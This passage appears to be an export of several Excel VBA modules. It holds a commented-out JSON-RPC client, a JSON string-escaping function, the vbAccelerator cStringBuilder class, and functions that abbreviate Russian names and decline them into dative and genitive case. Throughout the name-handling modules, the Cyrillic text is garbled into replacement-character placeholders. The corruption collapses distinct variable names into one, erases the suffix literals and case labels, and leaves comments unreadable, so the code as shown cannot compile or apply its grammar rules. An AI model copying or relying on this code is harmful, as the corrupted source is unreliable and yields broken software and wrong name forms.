'    If Len(user) > 0 Then   ' If Not IsMissing(user) Then
'        cli.Open "POST", url, False, user, pwd
'    Else
'        cli.Open "POST", url, False
'    End If
'    cli.setRequestHeader "Content-Type", "application/json"
'    cli.Send pText
'
'    If cli.Status <> 200 Then
'        Err.Raise vbObjectError + INVALID_RPC_CALL + cli.Status, , cli.statusText
'    End If
'
'    Set r = parse(cli.responseText)
'    Set cli = Nothing
'
'    If r("id") <> reqId Then Err.Raise vbObjectError + INVALID_RPC_CALL, , "Bad Response id"
'
'    If r.Exists("error") Or Not r.Exists("result") Then
'        Err.Raise vbObjectError + INVALID_RPC_CALL, , "Json-Rpc Response error: " & r("error")("message")
'    End If
'
'    If Not r.Exists("result") Then Err.Raise vbObjectError + INVALID_RPC_CALL, , "Bad Response, missing result"
'
'    Set JsonRpcCall = r("result")
'End Function




Public Function toUnicode(txt As String) As String

    Dim x As Long
    Dim uStr As New cStringBuilder
    Dim uChrCode As Integer

    For x = 1 To Len(txt)
        uChrCode = Asc(Mid(txt, x, 1))
        Select Case uChrCode
            Case 8:        ' backspace
                uStr.Append "\b"
            Case 9:        ' tab
                uStr.Append "\t"
            Case 10:        ' line feed
                uStr.Append "\n"
            Case 12:        ' formfeed
                uStr.Append "\f"
            Case 13:        ' carriage return
                uStr.Append "\r"
            Case 34:        ' quote
                uStr.Append "\"""
            Case 39:        ' apotxtophe
                uStr.Append "\'"
            Case 92:        ' backslash
                uStr.Append "\\"
            Case 123, 125:        ' "{" and "}"
                uStr.Append ("\u" & Right("0000" & Hex(uChrCode), 4))
            Case Is < 32, Is > 127:        ' non-ascii characters
                uStr.Append ("\u" & Right("0000" & Hex(uChrCode), 4))
            Case Else
                uStr.Append Chr$(uChrCode)
        End Select
    Next
    toUnicode = uStr.toString
    Exit Function

End Function

Private Sub Class_Initialize()
    psErrors = ""
End Sub
Attribute VB_Name = "cStringBuilder"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

' ======================================================================================
' Name:     vbAccelerator cStringBuilder
' Author:   Steve McMahon (steve@vbaccelerator.com)
' Date:     1 January 2002
'
' Copyright |fffd| 2002 Steve McMahon for vbAccelerator
' --------------------------------------------------------------------------------------
' Visit vbAccelerator - advanced free source code for VB programmers
' http://vbaccelerator.com
' --------------------------------------------------------------------------------------
'
' VB can be slow to append strings together because of the continual
' reallocation of string size.  This class pre-allocates a string in
' blocks and hence removes the performance restriction.
'
' Quicker insert and remove is also possible since string space does
' not have to be reallocated.
'
' Example:
' Adding "http://vbaccelerator.com/" 10,000 times to a string:
' Standard VB:   34s
' This Class:    0.35s
'
' ======================================================================================

#If Win64 Then
    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
#Else
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
#End If


Private m_sString As String
Private m_iChunkSize As Long
Private m_iPos As Long
Private m_iLen As Long

Public Property Get Length() As Long
    Length = m_iPos \ 2
End Property

Public Property Get Capacity() As Long
    Capacity = m_iLen \ 2
End Property

Public Property Get ChunkSize() As Long
    ' Return the unicode character chunk size:
    ChunkSize = m_iChunkSize \ 2
End Property

Public Property Let ChunkSize(ByVal iChunkSize As Long)
    ' Set the chunksize.  We multiply by 2 because internally
    ' we are considering bytes:
    m_iChunkSize = iChunkSize * 2
End Property

Public Property Get toString() As String
    ' The internal string:
    If m_iPos > 0 Then
        toString = Left$(m_sString, m_iPos \ 2)
    End If
End Property

Public Property Let TheString(ByRef sThis As String)
    Dim lLen As Long

    ' Setting the string:
    lLen = LenB(sThis)
    If lLen = 0 Then
        'Clear
        m_sString = ""
        m_iPos = 0
        m_iLen = 0
    Else
        If m_iLen < lLen Then
            ' Need to expand string to accommodate:
            Do
                m_sString = m_sString & Space$(m_iChunkSize \ 2)
                m_iLen = m_iLen + m_iChunkSize
            Loop While m_iLen < lLen
        End If
        CopyMemory ByVal StrPtr(m_sString), ByVal StrPtr(sThis), lLen
        m_iPos = lLen
    End If

End Property

Public Sub Clear()
    m_sString = ""
    m_iPos = 0
    m_iLen = 0
End Sub

Public Sub AppendNL(ByRef sThis As String)
    Append sThis
    Append vbCrLf
End Sub

Public Sub Append(ByRef sThis As String)
    Dim lLen As Long
    Dim lLenPlusPos As Long

    ' Append an item to the string:
    lLen = LenB(sThis)
    lLenPlusPos = lLen + m_iPos
    If lLenPlusPos > m_iLen Then
        Dim lTemp As Long

        lTemp = m_iLen
        Do While lTemp < lLenPlusPos
            lTemp = lTemp + m_iChunkSize
        Loop

        m_sString = m_sString & Space$((lTemp - m_iLen) \ 2)
        m_iLen = lTemp
    End If

    CopyMemory ByVal UnsignedAdd(StrPtr(m_sString), m_iPos), ByVal StrPtr(sThis), lLen
    m_iPos = m_iPos + lLen
End Sub

Public Sub AppendByVal(ByVal sThis As String)
    Append sThis
End Sub

Public Sub Insert(ByVal iIndex As Long, ByRef sThis As String)
    #If Win64 Then
        Dim lPos As LongPtr
    #Else
        Dim lPos As Long
    #End If
    Dim lLen As Long
    Dim lSize As Long

    ' is iIndex within bounds?
    If (iIndex * 2 > m_iPos) Then
        Err.Raise 9
    Else

        lLen = LenB(sThis)
        If (m_iPos + lLen) > m_iLen Then
            m_sString = m_sString & Space$(m_iChunkSize \ 2)
            m_iLen = m_iLen + m_iChunkSize
        End If

        ' Move existing characters from current position
        lPos = UnsignedAdd(StrPtr(m_sString), iIndex * 2)
        lSize = m_iPos - iIndex * 2

        ' moving from iIndex to iIndex + lLen
        CopyMemory ByVal UnsignedAdd(lPos, lLen), ByVal lPos, lSize

        ' Insert new characters:
        CopyMemory ByVal lPos, ByVal StrPtr(sThis), lLen

        m_iPos = m_iPos + lLen
    End If
End Sub

Public Sub InsertByVal(ByVal iIndex As Long, ByVal sThis As String)
    Insert iIndex, sThis
End Sub

Public Sub Remove(ByVal iIndex As Long, ByVal lLen As Long)
    #If Win64 Then
        Dim lSrc As LongPtr
        Dim lDst As LongPtr
    #Else
        Dim lSrc As Long
        Dim lDst As Long
    #End If
    Dim lSize As Long

    ' is iIndex within bounds?
    If (iIndex * 2 > m_iPos) Then
        Err.Raise 9
    Else
        ' is there sufficient length?
        If ((iIndex + lLen) * 2 > m_iPos) Then
            Err.Raise 9
        Else
            ' Need to copy characters from iIndex*2 to m_iPos back by lLen chars:
            lSrc = UnsignedAdd(StrPtr(m_sString), (iIndex + lLen) * 2)
            lDst = UnsignedAdd(StrPtr(m_sString), iIndex * 2)
            lSize = (m_iPos - (iIndex + lLen) * 2)
            CopyMemory ByVal lDst, ByVal lSrc, lSize
            m_iPos = m_iPos - lLen * 2
        End If
    End If
End Sub

Public Function Find(ByVal sToFind As String, _
                     Optional ByVal lStartIndex As Long = 1, _
                     Optional ByVal compare As VbCompareMethod = vbTextCompare _
                     ) As Long

    Dim lInstr As Long
    If (lStartIndex > 0) Then
        lInstr = InStr(lStartIndex, m_sString, sToFind, compare)
    Else
        lInstr = InStr(m_sString, sToFind, compare)
    End If
    If (lInstr < m_iPos \ 2) Then
        Find = lInstr
    End If
End Function

Public Sub HeapMinimize()
    Dim iLen As Long

    ' Reduce the string size so only the minimal chunks
    ' are allocated:
    If (m_iLen - m_iPos) > m_iChunkSize Then
        iLen = m_iLen
        Do While (iLen - m_iPos) > m_iChunkSize
            iLen = iLen - m_iChunkSize
        Loop
        m_sString = Left$(m_sString, iLen \ 2)
        m_iLen = iLen
    End If

End Sub

#If Win64 Then
Private Function UnsignedAdd(Start As LongPtr, Incr As Long) As LongPtr
#Else
Private Function UnsignedAdd(Start As Long, Incr As Long) As Long
#End If
' This function is useful when doing pointer arithmetic,
' but note it only works for positive values of Incr

If Start And &H80000000 Then        'Start < 0
    UnsignedAdd = Start + Incr
ElseIf (Start Or &H80000000) < -Incr Then
    UnsignedAdd = Start + Incr
Else
    UnsignedAdd = (Start + &H80000000) + (Incr + &H80000000)
End If

End Function

Private Sub Class_Initialize()
    ' The default allocation: 8192 characters.
    m_iChunkSize = 16384
End Sub

Attribute VB_Name = "mod_About_NEW"
Attribute VB_Name = "mod_BaseForSheetFunctions"
Option Compare Text        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Option Private Module

Public avOne, avTeens, avTens, avHundreds, avThousands

Public Function CropFIO(ByVal s, Optional ToLeft As Boolean = False) As String

    Dim sv As Variant, s|fffd| As String, s|fffd| As String, s|fffd| As String, i As Long, k As Long
    Application.Volatile True

    If InStr(s, ".") > 0 Or Len(Trim$(s)) = 0 Then
        CropFIO = s        'CropFIO |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        Exit Function
    End If
    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    s = Replace(Application.Trim(s), Chr(30), "-")
    s = Replace(Replace(s, " -", "-"), "- ", "-")
    s = Replace(Replace(s, "' ", "'"), " '", "'")        ' |fffd| '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|; |fffd|' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|; |fffd|' |fffd||fffd||fffd||fffd|; |fffd|' |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    sv = Split(s)
    s|fffd| = vbNullString: s|fffd| = vbNullString: s|fffd| = vbNullString

    i = UBound(sv)
    If i < 1 Then CropFIO = s: Exit Function

    Select Case sv(i)
        Case "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|"
            '|fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd|, |fffd||fffd||fffd|
            i = i - 1
            s|fffd| = UCase(Left$(sv(i), 1)) & "."
            i = i - 1
        Case "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|"
            i = i - 1
        Case Else
            Select Case Right$(sv(i), 3)
                Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|"          ' + |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    If i >= 2 Then        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        s|fffd| = |fffd|ropWord(sv(i))
                    Else        '|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        s|fffd| = |fffd|ropWord(sv(i)): s|fffd| = sv(0)
                    End If
                    i = i - 1
                Case Else
                    k = InStr(sv(i), "-")
                    If k > 0 Then
                        Select Case Mid$(sv(i), k + 1)
                            Case "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|"
                                '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|-|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|-|fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|
                                s|fffd| = UCase(Left$(sv(i), 1)) & "."
                                i = i - 1
                                If i = 0 Then
                                    s|fffd| = s|fffd|
                                    s|fffd| = vbNullString
                                End If
                        End Select
                    ElseIf i > 2 Then
                        Select Case sv(i - 1)
                            Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|"
                                s|fffd| = UCase(Left$(sv(i), 1)) & "."        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                i = i - 2
                        End Select
                    Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        s|fffd| = UCase(Left$(sv(i), 1))
                        If Len(sv(i)) > 1 Then s|fffd| = s|fffd| & "."
                        i = i - 1
                    End If
            End Select
    End Select

    Select Case sv(0)
        Case "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "c|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|"
            If i >= 2 Then
                s|fffd| = sv(0) & " " & StrConv(sv(1), vbProperCase)
                s|fffd| = |fffd|ropWord(sv(2))
            Else        '|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If Len(s|fffd|) > 0 Then
                    s|fffd| = sv(0) & " " & StrConv(sv(1), vbProperCase)
                Else
                    s|fffd| = StrConv(sv(0), vbProperCase): s|fffd| = |fffd|ropWord(sv(1))
                End If
            End If
        Case Else
            If Len(s|fffd|) = 0 Then        '|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                s|fffd| = StrConv(sv(0), vbProperCase)
                If InStr(1, s|fffd|, "-") Then s|fffd| = sv(0)
                If Len(s|fffd|) = 0 Then s|fffd| = |fffd|ropWord(sv(1))
            End If
    End Select
    If ToLeft Then CropFIO = s|fffd| & s|fffd| & " " & s|fffd| Else CropFIO = s|fffd| & " " & s|fffd| & s|fffd|
End Function

Public Function |fffd|ropWord(s As Variant) As String
    If Len(s) = 1 Then
        |fffd|ropWord = s
    Else
        ss$ = UCase(Left$(s, 1)) & ".": k = InStr(s, "-")
        If k > 0 Then ss$ = ss$ & "-" & Mid$(s, k + 1, 1) & "."
        |fffd|ropWord = ss$
    End If
End Function

Function DativeCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:    ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 3) = "|fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ChrW(1110): sRes = sSurnamePart
                    Case "|fffd|", "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case Else: sRes = sSurnamePart & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = sSurnamePart & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                        If Len(sSurnamePart) <= 4 Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If Right(sSurnamePart, 3) = "|fffd||fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd|":
                        If Right(sSurnamePart, 2) = "|fffd||fffd|" Or Right(sSurnamePart, 2) = "|fffd||fffd|" Then
                            sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        Else
                            sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        End If
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        DativeCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetDativeException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            DativeCase = DativeCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|": DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ".": DativeCase = DativeCase & sName
                    Case Else: DativeCase = DativeCase & sName & "|fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|"
                        If Mid(sName, Len(sName) - 1, 1) = "|fffd|" Then
                            DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                        Else
                            DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                        End If
                    Case "|fffd|": DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case Else: DativeCase = DativeCase & sName
                End Select
            End If
        End If
        DativeCase = DativeCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 3) = ChrW(1201) & "|fffd||fffd|" Or Right(sPatronymic, 4) = ChrW(1179) & "|fffd||fffd||fffd|" _
           Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            DativeCase = DativeCase & sPatronymic
        Else
            If bMaleSex Then
                DativeCase = DativeCase & sPatronymic & "|fffd|"
            Else
                DativeCase = DativeCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd|"
            End If
        End If
    End If
    DativeCase = Replace(DativeCase, "-", "- ")
    DativeCase = StrConv(DativeCase, vbUnicode + vbProperCase)
    DativeCase = Replace(DativeCase, "- ", "-")
End Function

Function GetDativeException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetDativeException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetDativeException = "|fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetDativeException = "|fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetDativeException = txt$
    End Select
End Function


Function GenitiveCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:    ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")

